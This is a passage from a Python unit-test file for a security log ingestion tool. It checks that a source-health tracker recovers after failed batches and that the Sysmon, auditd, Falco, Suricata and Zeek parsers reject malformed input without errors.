        """After a successful batch following failures, status should be healthy."""
        self.tracker.reset_source("test-recover")
        self.tracker.register_source("test-recover")
        # Initial success to set last_ingestion_time
        self.tracker.record_ingestion("test-recover", inserted=1, skipped=0, errors=0)
        # Two failures
        self.tracker.record_error("test-recover", "fail1")
        self.tracker.record_ingestion("test-recover", inserted=0, skipped=0, errors=0)
        self.tracker.record_error("test-recover", "fail2")
        self.tracker.record_ingestion("test-recover", inserted=0, skipped=0, errors=0)
        # Recovery
        self.tracker.record_ingestion("test-recover", inserted=10, skipped=0, errors=0)
        src = self.tracker.get_status("test-recover")
        self.assertEqual(src["status"], "healthy")
        self.assertIsNone(src["last_error"])


# ═══════════════════════════════════════════════════════════════════════
# Invalid Input Tests
# ═══════════════════════════════════════════════════════════════════════

class TestInvalidInput(unittest.TestCase):
    """Verify that completely unparseable input is handled gracefully."""

    def test_sysmon_invalid_xml_batch(self):
        results = parse_sysmon_batch(["<not>valid</xml>", "<also>bad</xml>"])
        self.assertEqual(len(results), 0,
            f"Expected 0 parsed events from invalid XML, got {len(results)}")

    def test_auditd_all_unrecognized_lines(self):
        lines = [
            "type=SOMETHING_UNKNOWN msg=audit(100.0:1): comm=test exe=/bin/test",
            "type=ANOTHER_UNKNOWN msg=audit(100.0:2): comm=test2 exe=/bin/test2",
            "not even an audit line at all",
            "",
        ]
        results = parse_auditd_lines(lines)
        self.assertEqual(len(results), 0,
            f"Expected 0 parsed events from invalid auditd lines, got {len(results)}")

    def test_falco_all_invalid_json(self):
        lines = ["not json", "still not json", "{broken", ""]
        results = parse_falco_lines(lines)
        self.assertEqual(len(results), 0,
            f"Expected 0 parsed events from invalid Falco JSON, got {len(results)}")

    def test_suricata_all_invalid_json(self):
        for bad in ["not json", "", None]:
            self.assertIsNone(parse_suricata_eve(bad))

    def test_zeek_all_invalid_lines(self):
        for bad in ["", None, "#just a comment", "#separator \x09"]:
            self.assertIsNone(parse_zeek_log(bad))


if __name__ == "__main__":
    unittest.main()
